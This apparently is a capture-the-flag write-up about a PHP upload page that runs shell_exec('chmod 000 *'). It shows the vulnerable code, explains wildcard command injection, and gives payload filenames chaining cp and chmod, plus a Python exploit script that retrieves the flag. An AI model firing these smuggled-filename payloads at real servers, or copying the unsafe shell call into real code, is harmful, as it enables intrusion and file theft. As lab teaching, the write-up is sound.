The challenge presents a web application that allows users to upload `.txt` files. After upload, all files in the uploads directory have their permissions set to `000` (completely unreadable) using the `chmod` command.



The application  presents a simple file upload form

the vulnerable PHP code from `index.php`:

```php
<?php
if (isset($_FILES['file'])) {
    $uploadOk = 1;
    $target_dir = "/var/www/html/uploads/";
    $target_file = $target_dir . basename($_FILES["file"]["name"]);

    // File existence check
    if (file_exists($target_file)) {
        echo "Sorry, file already exists.";
        $uploadOk = 0;
    }

    // File size check
    if ($_FILES["file"]["size"] > 50000) {
        echo "Sorry, your file is too large you need to buy Nitro.";
        $uploadOk = 0;
    }

    // Extension validation
    if (!str_ends_with($target_file, '.txt')) {
        echo "Due to exploit you can only upload files with .txt extensions...";
        $uploadOk = 0;
    }

    // Upload the file
    if ($uploadOk == 0) {
        echo "Sorry, your file was not uploaded.";
    } else {
        if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
            echo "The file ". htmlspecialchars(basename($_FILES["file"]["name"])). " has been uploaded.";
        } else {
            echo "Sorry, there was an error uploading your file.";
        }
    }

    // VULNERABLE CODE: Change directory and chmod all files
    $old_path = getcwd();
    chdir($target_dir);
    shell_exec('chmod 000 *');  //  VULNERABILITY HERE
    chdir($old_path);
}
?>
```



The critical vulnerability lies in line 96:

```php
shell_exec('chmod 000 *');
```

Because the code executes `shell_exec('chmod 000 *')`, it invokes a real shell and relies on wildcard expansion, which causes `*` to be expanded into every filename in the directory before the command is executed. Since uploaded filenames originate from `$_FILES["file"]["name"]` and are not sanitized, an attacker can upload a file whose name contains shell metacharacters such as `;`, `&`, or backticks. When the shell expands the wildcard, these characters are interpreted as part of the command rather than as literal filenames, allowing additional commands to be injected and executed in the context of the web server. This happens because argument expansion occurs prior to command execution, and the code neither quotes the arguments nor avoids shell usage altogether, turning attacker-controlled filenames into executable shell syntax.




When the shell executes `chmod 000 *`, it:
1. Lists all files in `/var/www/html/uploads/`
2. Expands `*` to the actual filenames
3. Constructs the command: `chmod 000 file1 file2 file3 ...`

If a filename contains shell metacharacters (like `;`), those characters are interpreted as shell commands!



If we upload a file named: `a.txt;whoami;#.txt`

The shell expands it to:
```bash
chmod 000 a.txt;whoami;#.txt flag.txt
```

When the attacker uploads a file named `a.txt;cp flag.txt pwned.txt;chmod 644 pwned.txt;#.txt`, the `.txt` suffix satisfies the PHP extension check, allowing the upload to succeed. Later, when `shell_exec('chmod 000 *')` is executed, the shell expands the `*` wildcard into all filenames in the directory, including this malicious one. Because the filename contains shell metacharacters, the shell interprets the expanded result as multiple separate commands rather than a single `chmod` invocation. The first token (`chmod 000 a.txt`) is treated as a normal permission change, after which the injected `cp flag.txt pwned.txt` command copies the sensitive file, and `chmod 644 pwned.txt` restores readable permissions on the copied file. The `#` character then comments out the remainder of the expanded command line, preventing the subsequent `chmod 000` from affecting `pwned.txt` or other files. T

When `shell_exec('chmod 000 *')` runs, the shell first expands the `*` wildcard into all filenames in the directory, including the attacker-controlled one. Because the filename contains shell metacharacters, the expanded command becomes `chmod 000 a.txt;cp flag.txt pwned.txt;chmod 644 pwned.txt;#.txt flag.txt`, which the shell then parses as multiple commands. It first attempts `chmod 000 a.txt` and fails harmlessly, then executes `cp flag.txt pwned.txt` to copy the flag, followed by `chmod 644 pwned.txt` to make the copied file readable. Finally, the `#` turns the rest of the line into a comment, so no further `chmod` is applied, leaving `pwned.txt` accessible.




 exploit code (`exploit.py`):

```python
#!/usr/bin/env python3
import requests

# Configuration
URL = "http://localhost:8080"

# Payload explanation:
# 1. `a.txt` satisfies the `.txt` extension requirement for PHP validation
# 2. `;cp flag.txt pwned.txt` copies the flag to a new file after chmod tries to process 'a.txt'
# 3. `;chmod 644 pwned.txt` makes pwned.txt readable (bypassing the chmod 000)
# 4. `;#.txt` comments out the rest: the `.txt` extension requirement is satisfied,
#    and anything after # (including `flag.txt` from the * expansion) is ignored
# 5. `#.txt` starts a comment, so the trailing `.txt` required by PHP validation is ignored by the shell,
#    AND any other files that `*` might have expanded to after our file are also commented out.

PAYLOAD_FILENAME = "a.txt;cp flag.txt pwned.txt;chmod 644 pwned.txt;#.txt"

def solve():
    print(f"[+] Targeting {URL}")

    # Step 1: Upload the malicious filename
    print(f"[+] Uploading payload filename: {PAYLOAD_FILENAME}")

    # Create a dummy file with our malicious filename
    files = {
        'file': (PAYLOAD_FILENAME, b'dummy content', 'text/plain')
    }

    response = requests.post(URL, files=files)
    print(f"[+] Upload response status: {response.status_code}")

    # Step 2: The PHP script will execute shell_exec('chmod 000 *')
    # This triggers our command injection

    # Step 3: Try to retrieve the flag from pwned.txt
    flag_url = f"{URL}/uploads/pwned.txt"
    print(f"[+] Attempting to retrieve flag from pwned.txt")

    flag_response = requests.get(flag_url)

    if flag_response.status_code == 200:
        print(f"[+] SUCCESS! Flag retrieved:")
        print(f"\n{'='*60}")
        print(flag_response.text)
        print(f"{'='*60}\n")
        return flag_response.text
    else:
        print(f"[-] Failed to retrieve flag. Status: {flag_response.status_code}")
        print(f"[-] The exploit might have failed or the file permissions are still wrong.")
        return None

if __name__ == "__main__":
    solve()
```

First, we upload a file with a **tricky filename** that still ends in `.txt`, so PHP allows it. The filename secretly contains extra shell commands. When the server later runs `chmod 000 *`, the shell expands `*` and **executes the commands hidden in the filename** instead of treating it as plain text.

Those injected commands copy `flag.txt` into a new file called `pwned.txt` and then change its permissions to `644`, making it readable. The `#` in the filename comments out the rest of the command, so `pwned.txt` does **not** get locked down.

Finally, since `pwned.txt` is readable and inside the web directory, we can download it with a simple HTTP request and get the flag.



